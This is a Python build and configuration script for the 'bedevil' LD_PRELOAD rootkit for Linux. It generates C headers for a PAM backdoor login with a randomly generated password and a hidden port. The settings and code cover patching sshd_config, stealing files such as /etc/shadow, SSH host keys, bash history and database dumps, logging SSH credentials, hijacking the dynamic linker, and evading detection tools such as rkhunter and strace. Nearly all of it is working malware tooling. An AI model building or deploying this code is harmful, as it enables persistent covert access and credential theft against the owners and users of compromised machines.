#!/usr/bin/env python

# SETTINGS

# by default the password & port are random values. you can change this.
BD_UNAME = 'changeme'
BD_PWD   = None
PAM_PORT = None

# the following settings are for patching of /etc/ssh/sshd_config to make sure that our PAM backdoor stays accessible.
# HARD_PATCH_SSHD_CONFIG is the original method. this method makes sure the file itself stays the way we want.
# SOFT_PATCH_SSHD_CONFIG is the better method. when sshd is reading sshd_config, it reads what we say it should read.
# the arrays are in order respectively of each other. not that even matters much..it will when/if there are more settings
# to take care of.
HARD_PATCH_SSHD_CONFIG = False
SOFT_PATCH_SSHD_CONFIG = True
PATCH_TARGETS = ['PasswordAuthentication', 'UsePAM']  #  target settings to keep on top of...
ANTIVAL    = ['no', 'no']          # what they shouldn't/can't be.
TARGETVAL  = ['yes', 'yes']        # what they will be now.


READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
GID_CHANGE_MINTIME = 60 * 30

HIDE_MY_ASS      = True     # keep track of hidden things outside of the rootkit's directories. for rehiding upon a GID change.
UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS.
CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.

LOG_LOCAL_AUTH = True   # log successful auths for users on the box.
LOG_SSH        = True   # log outgoing ssh login attempts.


# "steal" files that may be of interest. they will be updated if there are changes in size.
# wildcards for filenames work too..the files are stolen in the user's process so we're not modifying access times.
FILE_STEAL = True
MAX_FILE_SIZE      = (1024 * 1024) * 20   # don't try to steal files bigger than 20mb. set to None to disable limit. memory is allocated in chunks for target files.
FILE_CLEANSE_TIMER = (60 * 60) * 24       # remove stolen files once each day. you may want to change this value...set to None to disable this.
INTERESTING_FILES  = ['passwd',                     'shadow',                 'sshd_config',
                      'ssh_config',                 'ssh_host_dsa_key',       'ssh_host_dsa_key.pub',
                      'ssh_host_ecdsa_key',         'ssh_host_ecdsa_key.pub', 'ssh_host_ed25519_key',
                      'ssh_host_ed25519_key.pub',   'ssh_host_rsa_key',       'ssh_host_rsa_key.pub',
                      'apache.log', 'known_hosts',  '.bash_history',
                      '*.txt', '*.sql',   '*.php', '*.zip',
                      '*.tar', '*.tar.*', '*.rar', '*.db']
# stolen files are read & written in chunks. these are the relative settings.
BLOCKS_COUNT   = 10       # the default value for how many chunks files contents will be divided into.
MAX_BLOCK_SIZE = 1024*40  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 40kb default. set to None to disable.

# when copying the file fails, or it exceeds MAX_FILE_SIZE, link it instead of copying it.
SYMLINK_FALLBACK = True


# patch the dynamic linker libraries as to overwrite the original /etc/ld.so.preload path with our own.
# setting to False will instruct the rootkit to use /etc/ld.so.preload instead.
PATCH_DYNAMIC_LINKER = True


# END OF SETTINGS


# other random stuff


# bdvl will unset these environment variables in its processes.
unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']

# valid package managers available from `./bdv <pkgman>`
validpkgmans = ['apt', 'yum', 'pacman', 'emerge']

# things to hide from. the rootkit is uninstalled during the runtime of either,
#    a. processes with certain environment variables set,
#    b. processes that need to access certain paths,
#    c. or just processes whose names match those below.
scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*', '*/*ld-*.so', '*ld-*.so']
scary_procs = ['lsrootkit', 'ldd', 'unhide', 'rkhunter', 'chkproc', 'chkdirs', 'ltrace', 'strace']

# valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']

ldpaths = ['/lib/ld-linux.so.2', '/lib/ld-linux.so.3', '/lib/ld-linux-armhf.so.3', '/lib32/ld-2.31.so',
           '/lib32/ld-linux.so.2', '/lib64/ld-linux-x86-64.so.2']




from crypt import crypt
from shutil import copytree, copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system, unlink
from os.path import join, basename, isdir, dirname
from binascii import hexlify




class Util():
    def randgarb(self, garbset, garblen):
        garb = ''.join(choice(garbset) for _ in range(garblen))
        return garb

    def cryptpw(self, plain):
        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
        hashd = crypt(plain, "$6$"+salt)
        return hashd

    def randpath(self, maxlen):
        rootdirs = ['/usr', '/etc', '/lib']
        randroot = choice(rootdirs)
        randdir = choice(listdir(randroot))

        while len(randdir) < maxlen:
            randdir += self.randgarb(ascii_lowercase, 1)

        while len(randdir) > maxlen:
            randdir = randdir[:-1]

        suffix = self.randgarb(ascii_lowercase, 3)
        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
        if newpath in USED_PATHS or '.' in newpath:
            newpath = self.randpath(maxlen)
        USED_PATHS.append(newpath)
        return newpath

    def randpaths(self, count):
        allpaths = []
        for i in range(count):
            maxlen = choice(range(4, 8))
            thispath = self.randpath(maxlen)
            allpaths.append(thispath)
        return allpaths


class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents


# handy class. trusty class. thank you class.
class CArray(): # default is assumed to be an array of char pointers
    def __init__(self, name, alist, arrtype='char*'):
        self.name = name
        self.sizen = name.upper() + '_SIZE'
        self.list_len = len(alist)
        self.array_list = alist
        self.arrtype = arrtype

        # 0=data type,1=arrayname,2=sizename
        self.typeformat = 'static {0} const {1}[{2}] = '.format(self.arrtype, self.name, self.sizen)

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.sizen, self.list_len)
        return size_def

    def declarearray(self):
        return self.typeformat

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:
            if self.arrtype == 'char*':
                elems += '"{0}",'.format(elem)
            else:
                elems += '{0},'.format(elem)
        elems = elems[:-1] + '};\n'
        return elems

    # create full C array.
    def create(self):
        result = self.getsizedef()
        result += self.declarearray()
        result += self.buildelems()
        return result


# 'random' paths we've already got.
USED_PATHS = []
# stores all names of hooked funcs
ALL_HOOKS = []

# bunch of settings related stuff...
ut = Util()

if BD_UNAME == None:
    BD_UNAME = ut.randgarb(ascii_lowercase, 7)
if BD_PWD == None:
    BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 8)
if PAM_PORT == None:
    PAM_PORT = choice(range(11111, 63556))

# ideally there will be more in here... ports in here are hidden & cannot be unhidden.
bdvlports = [PAM_PORT]

print('Username: ' + BD_UNAME)
print('Password: ' + BD_PWD)
print('Hidden ports: ' + str(PAM_PORT))

MAGIC_GID = choice(range(22222222, 66666666))

INSTALL_DIR = ut.randpath(7)
HOMEDIR = ut.randpath(7)
BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
OLD_PRELOAD = '/etc/ld.so.preload'

CLEANEDTIME_PATH = ut.randpath(7)
if FILE_CLEANSE_TIMER == None:
    CLEANEDTIME_PATH = None

INC      = 'inc'
NEW_INC  = 'new_inc'
CONFIGH      = NEW_INC + '/config.h'
HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads BDVLSO from here.

BDVLH = NEW_INC + '/bedevil.h'
SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
    'BD_UNAME':BD_UNAME,                  'BD_PWD':ut.cryptpw(BD_PWD),
    'MAGIC_GID':MAGIC_GID,                'BD_VAR':ut.randgarb(ascii_uppercase, 9),
    'INSTALL_DIR':INSTALL_DIR,            'HOMEDIR':HOMEDIR,
    'BDVLSO':BDVLSO,                      'SOPATH':SOPATH,
    'PRELOAD_FILE':ut.randpath(10),       'SSH_LOGS':ut.randpath(7),
    'INTEREST_DIR':ut.randpath(7),        'HIDEPORTS':ut.randpath(7),
    'GID_PATH':ut.randpath(5),            'GIDTIME_PATH':ut.randpath(5),
    'PAM_PORT':PAM_PORT,                  'SSHD_CONFIG':'/etc/ssh/sshd_config',
    'LOG_PATH':ut.randpath(7),            'ASS_PATH':ut.randpath(7),
    'MAX_FILE_SIZE':MAX_FILE_SIZE,        'BASHRC_PATH':HOMEDIR+'/.bashrc',
    'PROFILE_PATH':HOMEDIR+'/.profile',   'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
    'CLEANEDTIME_PATH':CLEANEDTIME_PATH,  'OLD_PRELOAD':OLD_PRELOAD,
    'BLOCKS_COUNT':BLOCKS_COUNT,          'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE
}

# the following paths are linked to within the installation directory.
# & removed when we aren't logged into the box.
LINKPATHS = {
    SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
    SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
    SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir'
}

# these must be checked & based on the values, subsequently written to config.h
# so that the kit knows what stuff to do & what not to do.
CHECKTHESE = {
    'HARD_PATCH_SSHD_CONFIG':HARD_PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,               'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
    'HIDE_MY_ASS':HIDE_MY_ASS,                         'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
    'LOG_SSH':LOG_SSH,                                 'FILE_STEAL':FILE_STEAL,
    'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,                 'SYMLINK_FALLBACK':SYMLINK_FALLBACK,
    'UNINSTALL_MY_ASS':UNINSTALL_MY_ASS,               'SOFT_PATCH_SSHD_CONFIG':SOFT_PATCH_SSHD_CONFIG,
    'PATCH_DYNAMIC_LINKER':PATCH_DYNAMIC_LINKER
}

# paths that belong to toggles. here paths suffixed with a '/' are treated as directories
# by the rootkit. upon logging into the backdoor, if these paths do not exist they are
# created. this saves auto.sh some work.
TOGGLE_PATHS = {
    SETTINGS['SSH_LOGS']:LOG_SSH,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
    SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
    SETTINGS['ASS_PATH']:HIDE_MY_ASS,
    SETTINGS['INTEREST_DIR']+'/':FILE_STEAL,
    SETTINGS['CLEANEDTIME_PATH']:CLEANEDTIME_PATH
}

NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
    '/proc':True,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['INSTALL_DIR']:True,
    SETTINGS['PRELOAD_FILE']:True,
    SETTINGS['OLD_PRELOAD']:True,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
    SETTINGS['HIDEPORTS']:True,
    SETTINGS['SSH_LOGS']:LOG_SSH,
    SETTINGS['INTEREST_DIR']:FILE_STEAL,
    SETTINGS['HOMEDIR']:True,
    SETTINGS['ASS_PATH']:True,
    SETTINGS['CLEANEDTIME_PATH']:True
}

# read the list of hooked function names from libdl directory &
# create C arrays for them where the contents are referenced by
# the hook() & call() macro wrappers & their functions defined
# in libdl.h.
def gethooks():
    fd = open(HOOKS_PATH, 'r')
    contents = fd.read().split('\n')
    fd.close()

    allhooks = ''
    for line in contents:
        # empty lines or comment lines are of no interest to us.
        if len(line) == 0 or line[0] == '#':
            continue

        # libname:hook1,hook2,hook3,hook4...
        curtoks = line.split(':')
        
        targetlib = curtoks[0]
        targetsyms = curtoks[1]

        # divide all hooked function names into one list.
        hooktoks = targetsyms.split(',')

        # add all of the hooked function names from the current target library into a list for all.
        for curhook in hooktoks:
            ALL_HOOKS.append(curhook)

        # create the C array for the current target lib & the hooked functions
        newarr = CArray(targetlib, hooktoks)
        allhooks += newarr.create()

    return allhooks

def checktoggles(keys, values):
    count = len(keys)
    okhere = ''
    for i in range(count):
        if values[i] == True:
            okhere += '#define {0}\n'.format(keys[i])
    return okhere

# hex the contents of a path & return it as a char array.
def hexarraylifypath(path, arrname):
    fd = open(path, 'rb')
    contents = fd.read()
    fd.close()

    contentshex = hexlify(contents)
    contentslist = ['0x'+contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
    contentsarr = CArray(arrname, contentslist, arrtype='char')
    return contentsarr.create()

def listconditional(dictlist):
    keys   = list(dictlist.keys())
    values = list(dictlist.values())
    goodkeys = []
    for i in range(len(keys)):
        if values[i] == True:
            goodkeys.append(keys[i])
    return goodkeys

def setup_config():
    copytree(INC, NEW_INC)

    # determine the status of stuff & define it if needed
    KEYS = list(CHECKTHESE.keys())
    VALUES = list(CHECKTHESE.values())
    configh = checktoggles(KEYS, VALUES)
    if AUTO_GID_CHANGER == True:
        configh += '#define GID_CHANGE_MINTIME {0}\n'
        configh = configh.format(GID_CHANGE_MINTIME)
    fd = open(CONFIGH, 'a')
    fd.write(configh)
    fd.close()

    # write all settings & values to bedevil.h
    KEYS   = list(SETTINGS.keys())
    VALUES = list(SETTINGS.values())
    gotbdvlh = gethooks()

    for settingi in range(len(SETTINGS)):
        target = KEYS[settingi]
        value = VALUES[settingi]

        skip = False
        togpathkeys = list(TOGGLE_PATHS.keys())
        togpathvals = list(TOGGLE_PATHS.values())
        for key in togpathkeys:
            if value == key and TOGGLE_PATHS[key] == False:
                skip = True
                break

        if value == None or skip == True:
            continue             

        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
            gotbdvlh += '#define _{0}LEN {1}\n'.format(target, len(str(value)))
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))

    defs = Definitions(ALL_HOOKS)
    gotbdvlh += defs.getidents()

    fd = open('etc/.rolf', 'r')
    rolf = fd.read().strip().split('\n')
    fd.close()

    if FILE_STEAL == True:
        bashrcarr = CArray('interesting_files', INTERESTING_FILES)
        gotbdvlh += bashrcarr.create()

    alllinksrcs = []
    KEYS = list(LINKPATHS.keys())
    VALUES = list(LINKPATHS.values())
    for i in range(len(KEYS)):
        thislinkpath = '{0}:{1}'.format(KEYS[i], SETTINGS['HOMEDIR']+'/'+VALUES[i])
        alllinksrcs.append(thislinkpath)

    linksrc  = []
    linkdest = []
    for link in alllinksrcs:
        link = link.split(':')
        linksrc.append(link[0])
        linkdest.append(link[1])

    bdvlarrays = { # write all of these lists to bedevil.h as arrays of char pointers
        'linksrcs':linksrc,                 'linkdests':linkdest,
        'unsetvars':unsetvars,              'togpaths':listconditional(TOGGLE_PATHS),
        'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
        'scary_variables':scary_variables,  'scary_paths':scary_paths,
        'scary_procs':scary_procs,          'valid_platforms':valid_platforms,
        'rolfs':rolf,                       'all':ALL_HOOKS,
        'ldpaths':ldpaths
    }

    arraynames = list(bdvlarrays.keys())
    targetarrays = list(bdvlarrays.values())
    for i in range(len(arraynames)):
        thisarr = CArray(arraynames[i], targetarrays[i])
        gotbdvlh += thisarr.create()

    bdvlportsarr = CArray('bdvlports', bdvlports, arrtype='int')
    gotbdvlh += bdvlportsarr.create()

    if SOFT_PATCH_SSHD_CONFIG == True or HARD_PATCH_SSHD_CONFIG == True:
        patchlists = {'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL,
                      'targetval':TARGETVAL}
        patchkeys = list(patchlists.keys())
        patchvals = list(patchlists.values())
        for i in range(len(patchkeys)):
            thisarr = CArray(patchkeys[i], patchvals[i])
            gotbdvlh += thisarr.create()

    gotbdvlh += 'syms symbols[ALL_SIZE];\n'

    # done.
    fd = open(BDVLH, 'w')
    fd.write(gotbdvlh)
    fd.close()

    # auto.sh stuff
    fd = open(SETTINGS_CFG, 'w')
    fd.write(SETTINGS['BDVLSO']+'\n')
    fd.close()

    # mk tar.gz of include dir. b64 it. rm it.
    system('tar cpfz {0}.tar.gz {1}/'.format(BD_UNAME, NEW_INC))
    fd = open(BD_UNAME+'.tar.gz', 'rb')
    targzb64 = b64encode(fd.read())
    fd.close()
    unlink(BD_UNAME+'.tar.gz')
    
    # write b64.
    fd = open(BD_UNAME+'.b64', 'wb')
    fd.write(targzb64)
    fd.close()




if __name__ == '__main__':
    setup_config()
    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), BD_PWD)
    print('\n\t\033[1;31m{0}\033[0m\n'.format(template))

